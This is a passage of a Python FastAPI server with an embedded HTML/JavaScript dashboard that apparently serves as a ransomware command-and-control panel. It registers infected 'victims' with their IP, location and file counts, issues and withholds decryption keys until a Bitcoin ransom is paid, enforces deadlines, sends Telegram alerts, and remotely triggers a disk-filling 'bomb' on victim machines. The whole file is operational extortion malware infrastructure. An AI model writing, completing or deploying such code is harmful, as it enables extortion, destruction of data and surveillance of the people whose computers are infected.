                <button class="action-btn" onclick="stopBomb()">STOP BOMB</button>
                <button class="action-btn" onclick="deleteVictim()">DELETE</button>
            </div>
        </div>
    </div>

    <script>
        var currentVictim = null;
        var victims = [];
        var accessToken = localStorage.getItem('access_token');
        
        if (accessToken) {
            document.getElementById('loginView').style.display = 'none';
            document.getElementById('dashboardView').style.display = 'block';
            loadData();
        }
        
        function login() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            
            fetch('/api/owner/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({email: email, password: password})
            })
            .then(function(response) { return response.json(); })
            .then(function(data) {
                if (data.access_token) {
                    localStorage.setItem('access_token', data.access_token);
                    document.getElementById('loginView').style.display = 'none';
                    document.getElementById('dashboardView').style.display = 'block';
                    loadData();
                } else {
                    document.getElementById('loginError').innerText = '> ACCESS DENIED';
                }
            })
            .catch(function() {
                document.getElementById('loginError').innerText = '> CONNECTION ERROR';
            });
        }
        
        function logout() {
            localStorage.removeItem('access_token');
            document.getElementById('loginView').style.display = 'block';
            document.getElementById('dashboardView').style.display = 'none';
        }
        
        function loadData() {
            loadTelegramStatus();
            loadStats();
            loadVictims();
        }
        
        function loadTelegramStatus() {
            fetch('/api/telegram/status', {
                headers: {'Authorization': 'Bearer ' + localStorage.getItem('access_token')}
            })
            .then(function(response) { return response.json(); })
            .then(function(data) {
                var statusDiv = document.getElementById('telegramStatus');
                if (data.enabled) {
                    statusDiv.innerHTML = '> TELEGRAM BOT: <span class="telegram-enabled">ENABLED</span> | CHAT ID: ' + data.chat_id;
                } else {
                    statusDiv.innerHTML = '> TELEGRAM BOT: <span class="telegram-disabled">DISABLED</span>';
                }
            })
            .catch(function() {
                document.getElementById('telegramStatus').innerHTML = '> TELEGRAM STATUS: UNKNOWN';
            });
        }
        
        function testTelegram() {
            fetch('/api/telegram/test', {
                method: 'POST',
                headers: {'Authorization': 'Bearer ' + localStorage.getItem('access_token')}
            })
            .then(function(response) { return response.json(); })
            .then(function(data) {
                alert(data.success ? 'TEST MESSAGE SENT' : 'TEST FAILED');
            })
            .catch(function() {
                alert('TEST ERROR');
            });
        }
        
        function loadStats() {
            fetch('/api/stats')
            .then(function(response) { return response.json(); })
            .then(function(stats) {
                document.getElementById('totalVictims').textContent = stats.total || 0;
                document.getElementById('paidVictims').textContent = stats.paid || 0;
                document.getElementById('unpaidVictims').textContent = stats.unpaid || 0;
                document.getElementById('expiredVictims').textContent = stats.expired || 0;
                document.getElementById('totalFiles').textContent = (stats.total_files || 0).toLocaleString();
                document.getElementById('activeBombs').textContent = stats.active_bombs || 0;
            })
            .catch(function() {
                console.error('Stats error');
            });
        }
        
        function loadVictims() {
            fetch('/api/owner/victims', {
                headers: {'Authorization': 'Bearer ' + localStorage.getItem('access_token')}
            })
            .then(function(response) { return response.json(); })
            .then(function(data) {
                victims = data;
                renderTable();
            })
            .catch(function() {
                document.getElementById('tableBody').innerHTML = '<tr><td colspan="7" style="text-align:center;color:#ff0000;">> ERROR LOADING VICTIMS</td></tr>';
            });
        }
        
        function renderTable() {
            if (!victims.length) {
                document.getElementById('tableBody').innerHTML = '<tr><td colspan="7" style="text-align:center;">> NO VICTIMS FOUND</td></tr>';
                return;
            }
            
            var html = '';
            for (var i = 0; i < victims.length; i++) {
                var v = victims[i];
                var bombDisplay = v.bomb_status === 'active' ? 'ACTIVE' : 'INACTIVE';
                var bombClass = v.bomb_status === 'active' ? 'bomb-active' : '';
                
                html += '<tr>' +
                    '<td><small>' + (v.id || '').substring(0, 20) + '...</small></td>' +
                    '<td>' + (v.hostname || 'UNKNOWN') + '</td>' +
                    '<td>' + (v.ip || '0.0.0.0') + '</td>' +
                    '<td>' + (v.files || 0).toLocaleString() + '</td>' +
                    '<td><span class="status-' + (v.status || 'unknown') + '">' + (v.status || 'UNKNOWN').toUpperCase() + '</span></td>' +
                    '<td class="' + bombClass + '">' + bombDisplay + '<br><small>' + (v.bomb_size || 0).toFixed(1) + 'GB</small></td>' +
                    '<td>' +
                        '<button class="action-btn" onclick="viewVictim(\'' + v.id + '\')">VIEW</button>' +
                    '</td>' +
                '</tr>';
            }
            
            document.getElementById('tableBody').innerHTML = html;
        }
        
        function viewVictim(victimId) {
            fetch('/api/owner/victim/' + victimId, {
                headers: {'Authorization': 'Bearer ' + localStorage.getItem('access_token')}
            })
            .then(function(response) { return response.json(); })
            .then(function(data) {
                currentVictim = data;
                
                var details = '';
                for (var key in currentVictim) {
                    if (currentVictim.hasOwnProperty(key)) {
                        details += '<div style="padding:5px;background:#111;margin:2px 0;border-left:2px solid #330000;"><strong>' + key.toUpperCase() + ':</strong> ' + (currentVictim[key] || 'N/A') + '</div>';
                    }
                }
                
                document.getElementById('victimDetails').innerHTML = details;
                document.getElementById('victimModal').classList.add('show');
            })
            .catch(function() {
                alert('ERROR LOADING VICTIM DETAILS');
            });
        }
        
        function closeModal() {
            document.getElementById('victimModal').classList.remove('show');
            currentVictim = null;
        }
        
        function markPaid() {
            if (!currentVictim) return;
            
            fetch('/api/owner/mark-paid/' + currentVictim.id, {
                method: 'POST',
                headers: {'Authorization': 'Bearer ' + localStorage.getItem('access_token')}
            })
            .then(function(response) {
                if (response.ok) {
                    alert('MARKED AS PAID');
                    closeModal();
                    loadVictims();
                    loadStats();
                }
            })
            .catch(function() {
                alert('ERROR');
            });
        }
        
        function startBomb() {
            if (!currentVictim) return;
            
            fetch('/api/owner/bomb/start', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer ' + localStorage.getItem('access_token')
                },
                body: JSON.stringify({victim_id: currentVictim.id})
            })
            .then(function(response) {
                if (response.ok) {
                    alert('BOMB STARTED');
                    closeModal();
                    loadVictims();
                }
            })
            .catch(function() {
                alert('ERROR');
            });
        }
        
        function stopBomb() {
            if (!currentVictim) return;
            
            fetch('/api/owner/bomb/stop', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer ' + localStorage.getItem('access_token')
                },
                body: JSON.stringify({victim_id: currentVictim.id})
            })
            .then(function(response) {
                if (response.ok) {
                    alert('BOMB STOPPED');
                    closeModal();
                    loadVictims();
                }
            })
            .catch(function() {
                alert('ERROR');
            });
        }
        
        function deleteVictim() {
            if (!currentVictim) return;
            if (!confirm('DELETE VICTIM ' + currentVictim.id + '?')) return;
            
            fetch('/api/owner/delete-victim/' + currentVictim.id, {
                method: 'DELETE',
                headers: {'Authorization': 'Bearer ' + localStorage.getItem('access_token')}
            })
            .then(function(response) {
                if (response.ok) {
                    alert('VICTIM DELETED');
                    closeModal();
                    loadVictims();
                    loadStats();
                }
            })
            .catch(function() {
                alert('ERROR');
            });
        }
        
        setInterval(loadData, 30000);
    </script>
</body>
</html>
"""

# ============================================================================
# ROUTES - PUBLIC PAGES
# ============================================================================

@app.get("/", response_class=HTMLResponse)
async def login_page():
    """Main login page"""
    return HTMLResponse(content=LOGIN_PAGE)

@app.get("/victim/{victim_id}", response_class=HTMLResponse)
async def victim_page(victim_id: str):
    """Victim status page"""
    html = VICTIM_PAGE_TEMPLATE.replace('{{ victim_id }}', victim_id)
    return HTMLResponse(content=html)

@app.get("/owner/dashboard", response_class=HTMLResponse)
async def owner_dashboard():
    """Owner dashboard"""
    return HTMLResponse(content=OWNER_DASHBOARD_TEMPLATE)

# ============================================================================
# ROUTES - API (Public)
# ============================================================================

@app.get("/api/stats")
async def api_stats():
    """Public stats endpoint"""
    return get_stats()

@app.get("/api/victim/{victim_id}")
async def api_get_victim(victim_id: str):
    """Get victim details (public)"""
    try:
        result = supabase_admin.table('victims').select('*').eq('id', victim_id).execute()
        
        if not result.data:
            raise HTTPException(status_code=404, detail="Victim not found")
        
        victim = result.data[0]
        
        # Check deadline
        if victim['status'] == 'unpaid' and victim.get('deadline'):
            deadline = datetime.fromisoformat(victim['deadline'].replace('Z', '+00:00'))
            if datetime.utcnow() > deadline:
                supabase_admin.table('victims').update({'status': 'expired'}).eq('id', victim_id).execute()
                victim['status'] = 'expired'
        
        # Don't send key unless paid
        if victim['status'] != 'paid':
            victim['key'] = None
        
        return victim
        
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/add-victim")
async def api_add_victim(victim_data: VictimRegister):
    """Register new victim (called by client)"""
    try:
        victim_id = victim_data.victim_id or generate_victim_id()
        
        # Check if exists
        existing = supabase_admin.table('victims').select('id').eq('id', victim_id).execute()
        if existing.data:
            raise HTTPException(status_code=400, detail="Victim exists")
        
        # Calculate deadline
        deadline = (datetime.utcnow() + timedelta(hours=Config.DEFAULT_DEADLINE_HOURS)).isoformat()
        
        # Generate key
        encryption_key = generate_encryption_key()
        
        # Prepare victim data
        victim_dict = {
            'id': victim_id,
            'key': encryption_key,
            'deadline': deadline,
            'created': datetime.utcnow().isoformat(),
            'status': 'unpaid',
            'files': victim_data.files,
            'ransom': Config.DEFAULT_RANSOM_AMOUNT,
            'wallet': Config.DEFAULT_BTC_ADDRESS,
            'hostname': victim_data.hostname,
            'ip': victim_data.ip,
            'country': victim_data.country,
            'country_code': victim_data.country_code,
            'city': victim_data.city,
            'lat': victim_data.lat,
            'lon': victim_data.lon,
            'isp': victim_data.isp,
            'os': victim_data.os,
            'bomb_status': 'inactive',
            'bomb_size': 0
        }
        
        # Insert into Supabase
        result = supabase_admin.table('victims').insert(victim_dict).execute()
        
        # Send Telegram notification
        location = f"{victim_data.city}, {victim_data.country}" if victim_data.city != 'Unknown' else victim_data.country
        telegram.notify_new_victim(victim_id, location, victim_data.ip, victim_data.hostname)
        
        # Prepare response
        response = {
            'victim_id': victim_id,
            'key': encryption_key,
            'deadline': deadline,
            'ransom': Config.DEFAULT_RANSOM_AMOUNT,
            'wallet': Config.DEFAULT_BTC_ADDRESS
        }
        
        return response
        
    except HTTPException:
        raise
    except Exception as e:
        print(f"Error adding victim: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/update-victim")
async def api_update_victim(update_data: VictimUpdate):
    """Update victim info"""
    try:
        update_dict = {
            'last_seen': datetime.utcnow().isoformat()
        }
        
        if update_data.files_encrypted is not None:
            update_dict['files'] = update_data.files_encrypted
        
        supabase_admin.table('victims').update(update_dict).eq('id', update_data.victim_id).execute()
        
        return {'success': True}
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/verify-payment")
async def api_verify_payment(payment_data: PaymentVerify):
    """Verify payment from client"""
    try:
        # Update victim
        supabase_admin.table('victims').update({
            'status': 'paid',
            'paid_at': datetime.utcnow().isoformat(),
            'tx': payment_data.tx_id
        }).eq('id', payment_data.victim_id).execute()
        
        # Get victim details for notification
        victim = supabase_admin.table('victims').select('*').eq('id', payment_data.victim_id).execute()
        
        # Send Telegram notification
        if victim.data:
            telegram.notify_payment(
                payment_data.victim_id,
                victim.data[0].get('ransom', '0.5 BTC'),
                payment_data.tx_id
            )
        
        return {'success': True, 'key': victim.data[0]['key'] if victim.data else None}
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# ============================================================================
# ROUTES - API (Bomb Commands)
# ============================================================================

@app.get("/api/bomb/command/{victim_id}")
async def api_get_bomb_command(victim_id: str):
    """Get pending bomb command"""
    victim = supabase_admin.table('victims').select('bomb_status').eq('id', victim_id).execute()
    
    if victim.data and victim.data[0].get('bomb_status') == 'active':
        return {'action': 'start', 'filename': 'explosion.dat'}
    
    return {'action': 'none'}

@app.post("/api/bomb/update")
async def api_bomb_update(bomb_data: BombUpdate):
    """Update bomb status"""
    try:
        update_dict = {}
        
        if bomb_data.error:
            update_dict['bomb_status'] = 'error'
            telegram.notify_bomb_stop(bomb_data.client_id)
        else:
            update_dict['bomb_size'] = bomb_data.size_gb
            
            # Check if just started
            victim = supabase_admin.table('victims').select('bomb_status').eq('id', bomb_data.client_id).execute()
            if victim.data and victim.data[0].get('bomb_status') != 'active' and bomb_data.size_gb > 0:
                update_dict['bomb_status'] = 'active'
                telegram.notify_bomb_start(bomb_data.client_id)
        
        supabase_admin.table('victims').update(update_dict).eq('id', bomb_data.client_id).execute()
        
        return {'success': True}
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# ============================================================================
# ROUTES - API (Telegram)
# ============================================================================

@app.get("/api/telegram/status", dependencies=[Depends(JWTBearer())])
async def api_telegram_status():
    """Get Telegram bot status"""
    return {
        'enabled': telegram.enabled,
        'chat_id': telegram.chat_id if telegram.enabled else None
    }

@app.post("/api/telegram/test", dependencies=[Depends(JWTBearer())])
async def api_telegram_test():
    """Test Telegram bot"""
    if not telegram.enabled:
        raise HTTPException(status_code=400, detail="Telegram not configured")
    
    success = telegram.send("🧪 <b>TEST MESSAGE</b>\n\nOwner dashboard test")
    return {'success': success}

# ============================================================================
# ROUTES - API (Owner Only with JWT Auth) [citation:1][citation:4]
# ============================================================================

@app.post("/api/owner/login", response_model=OwnerLoginResponse)
async def api_owner_login(login_data: OwnerLogin):
    """Owner login using Supabase Auth"""
    try:
        # Authenticate with Supabase [citation:7]
        auth_response = supabase.auth.sign_in_with_password({
            "email": login_data.email,
            "password": login_data.password
        })
        
        if not auth_response.user:
            raise HTTPException(status_code=401, detail="Invalid credentials")
        
        # Return access token [citation:1]
        return OwnerLoginResponse(
            access_token=auth_response.session.access_token,
            token_type="bearer"
        )
        
    except Exception as e:
        print(f"Login error: {e}")
        raise HTTPException(status_code=401, detail="Invalid credentials")

@app.get("/api/owner/victims", dependencies=[Depends(JWTBearer())])
async def api_owner_victims(current_user: dict = Depends(get_current_user)):
    """Get all victims (owner only)"""
    try:
        result = supabase_admin.table('victims').select('*').order('created', desc=True).execute()
        return result.data
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/owner/victim/{victim_id}", dependencies=[Depends(JWTBearer())])
async def api_owner_victim(victim_id: str):
    """Get single victim (owner only)"""
    try:
        result = supabase_admin.table('victims').select('*').eq('id', victim_id).execute()
        
        if not result.data:
            raise HTTPException(status_code=404, detail="Not found")
        
        return result.data[0]
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/owner/mark-paid/{victim_id}", dependencies=[Depends(JWTBearer())])
async def api_owner_mark_paid(victim_id: str):
    """Mark victim as paid"""
    try:
        victim = supabase_admin.table('victims').select('*').eq('id', victim_id).execute()
        if not victim.data:
            raise HTTPException(status_code=404, detail="Victim not found")
        
        supabase_admin.table('victims').update({
            'status': 'paid',
            'paid_at': datetime.utcnow().isoformat()
        }).eq('id', victim_id).execute()
        
        # Send Telegram notification
        telegram.notify_payment(
            victim_id,
            victim.data[0].get('ransom', '0.5 BTC'),
            'manual_verification'
        )
        
        return {'success': True}
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/owner/bomb/start", dependencies=[Depends(JWTBearer())])
async def api_owner_bomb_start(bomb_data: BombControl):
    """Start bomb on victim"""
    try:
        supabase_admin.table('victims').update({
            'bomb_status': 'active',
            'bomb_size': 0
        }).eq('id', bomb_data.victim_id).execute()
        
        telegram.notify_bomb_start(bomb_data.victim_id)
        
        return {'success': True}
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/owner/bomb/stop", dependencies=[Depends(JWTBearer())])
async def api_owner_bomb_stop(bomb_data: BombControl):
    """Stop bomb on victim"""
    try:
        supabase_admin.table('victims').update({
            'bomb_status': 'stopped'
        }).eq('id', bomb_data.victim_id).execute()
        
        telegram.notify_bomb_stop(bomb_data.victim_id)
        
        return {'success': True}
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.delete("/api/owner/delete-victim/{victim_id}", dependencies=[Depends(JWTBearer())])
async def api_owner_delete_victim(victim_id: str):
    """Delete victim (careful!)"""
    try:
        supabase_admin.table('victims').delete().eq('id', victim_id).execute()
        return {'success': True}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# ============================================================================
# MAIN
# ============================================================================

if __name__ == '__main__':
    uvicorn.run(
        "main:app",
        host=Config.HOST,
        port=Config.PORT,
        reload=Config.DEBUG
    )
